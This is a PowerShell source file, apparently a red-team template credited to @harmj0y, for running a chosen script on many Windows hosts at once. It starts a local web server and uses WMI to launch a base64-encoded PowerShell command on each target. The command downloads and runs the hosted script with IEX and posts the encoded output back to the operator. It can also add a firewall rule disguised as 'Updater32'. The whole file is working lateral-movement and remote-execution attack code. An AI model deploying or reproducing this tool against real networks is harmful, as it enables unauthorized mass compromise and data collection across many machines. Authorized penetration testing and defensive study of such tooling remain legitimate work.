<#
    Template to mass-run a specific powershell script
    across multiple machines using a local web server
    and WMI execution.

    Replace "<INSERT SCRIPT HERE>" with the script you
    want run.

    by @harmj0y
#>


function Invoke-MassTemplate {
    <#
        .SYNOPSIS
        ...

       .PARAMETER Hosts
        Array of host names to run Invoke-X on.

        .PARAMETER HostList
        List of host names to run Invoke-X on.

        .PARAMETER LocalIpAddress
        Local IP address to use. Will try to determine if not specified.

        .PARAMETER LocalPort
        Local port to host the script on, defaults to 8080

        .PARAMETER ServerSleep
        Time to sleep the web server for output before shutting it down.
        Default to 30 seconds.

        .PARAMETER OutputFolder
        Folder to pipe host outputs to.

        .PARAMETER FireWallRule
        Add (and then remove) a firewall rule to allow access to the
        specified port.
    #>
    [cmdletbinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $LocalIpAddress,

        [String]
        $LocalPort="8080",

        [Int]
        $ServerSleep=30,

        [String]
        $OutputFolder="output",

        [Switch]
        $FireWallRule
        )


    begin {

        # script block to invoke over remote machines.
        $WebserverScriptblock={
            param($LocalPort, $OutputFolder)

            $HostedScript = 
@'

<INSERT SCRIPT HERE>

'@

            # webserver stub adapted from @obscuresec:
            #   https://gist.github.com/obscuresec/71df69d828e6e05986e9#file-dirtywebserver-ps1
            $Hso = New-Object Net.HttpListener
            $Hso.Prefixes.Add("http://+:$LocalPort/")
            $Hso.Start()
           
            while ($Hso.IsListening) {
                $HC = $Hso.GetContext()
                $OriginatingIP = $HC.Request.UserHostAddress
                $HRes = $HC.Response
                $HRes.Headers.Add("Content-Type","text/plain")
                $Buf = [Text.Encoding]::UTF8.GetBytes("")

                # process any GET requests
                if( $HC.Request.RawUrl -eq "/update"){
                    $Buf = [Text.Encoding]::UTF8.GetBytes($HostedScript)
                }
                elseif( $HC.Request.RawUrl -eq "/"){
                    $Buf = [Text.Encoding]::UTF8.GetBytes("")
                }
                # process any POST results from the invoked script
                else {
                    # extract the hostname from the URI request
                    $hostname = $HC.Request.RawUrl.split("/")[-1]

                    $output = ""
                    $size = $HC.Request.ContentLength64 + 1

                    $buffer = New-Object byte[] $size
                    do {
                        $count = $HC.Request.InputStream.Read($buffer, 0, $size)
                        $output += $HC.Request.ContentEncoding.GetString($buffer, 0, $count)
                    } until($count -lt $size)
                    $HC.Request.InputStream.Close()

                    if (($output) -and ($output.Length -ne 0)){
                        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($output))

                        $OutFile = $OutputFolder + "\$($hostname).txt"

                        $decoded | Out-File -Append -Encoding ASCII -FilePath $OutFile
                    }
                }
                $HRes.ContentLength64 = $Buf.Length
                $HRes.OutputStream.Write($Buf,0,$Buf.Length)
                $HRes.Close()
            }
        }

        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts += Get-Content -Path $HostList
            }
            else {
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
            }
        }

        # if the output file isn't a full path, append the current location to it
        if(-not ($OutputFolder.Contains("\"))){
            $OutputFolder = (Get-Location).Path + "\" + $OutputFolder
        }

        # create the output folder if it doesn't exist
        New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null

        # add a temporary firewall rule if specified
        if($FireWallRule){
            Write-Verbose "Setting inbound firewall rule for port $LocalPort"
            $fw = New-Object -ComObject hnetcfg.fwpolicy2
            $rule = New-Object -ComObject HNetCfg.FWRule
            $rule.Name = "Updater32"
            $rule.Protocol = 6
            $rule.LocalPorts = $LocalPort
            $rule.Direction = 1
            $rule.Enabled=$true
            $rule.Grouping="@firewallapi.dll,-23255"
            $rule.Profiles = 7
            $rule.Action=1
            $rule.EdgeTraversal=$false
            $fw.Rules.Add($rule)
        }

        Start-Job -Name WebServer -Scriptblock $WebserverScriptblock -ArgumentList $LocalPort,$OutputFolder | Out-Null
        Write-Verbose "Sleeping, letting the web server stand up..."
        Start-Sleep -s 5
    }

    process {

        if(-not $LocalIpAddress){
            $p = (gwmi Win32_NetworkAdapterConfiguration| Where{$_.IPAddress} | Select -Expand IPAddress);
            # check if the IP is a string or the [IPv4,IPv6] array
            $LocalIpAddress = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
        }

        $hosts | % {
            # the download/check back in command
            $command = "IEX (New-Object Net.Webclient).DownloadString('http://"+$LocalIpAddress+":$LocalPort/update') | % {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$_))} | % {(new-object net.webclient).UploadString('http://"+$LocalIpAddress+":$LocalPort/$_', `$_)}"
            $bytes = [Text.Encoding]::Unicode.GetBytes($command)
            $encodedCommand = [Convert]::ToBase64String($bytes)

            Write-Verbose "Executing command on host `"$_`""
            Invoke-WmiMethod -ComputerName $_ -Path Win32_process -Name create -ArgumentList "powershell.exe -enc $encodedCommand" | out-null
        }
    }

    end {

        Write-Verbose "Waiting $ServerSleep seconds for commands to trigger..."
        Start-Sleep -s $ServerSleep

        # perform any post-processing on the output files...
        Get-ChildItem $OutputFolder -Filter *.txt |
        foreach-object {
            $server = $_.Name.split(".")[0]
            $rawtext = [Io.File]::ReadAllText($_.FullName)
            # ...
        }

        # remove the firewall rule if specified
        if($FireWallRule){
            Write-Verbose "Removing inbound firewall rule"
            $fw.rules.Remove("Updater32")
        }

        Write-Verbose "Killing the web server"
        Get-Job -Name WebServer | Stop-Job
    }
}
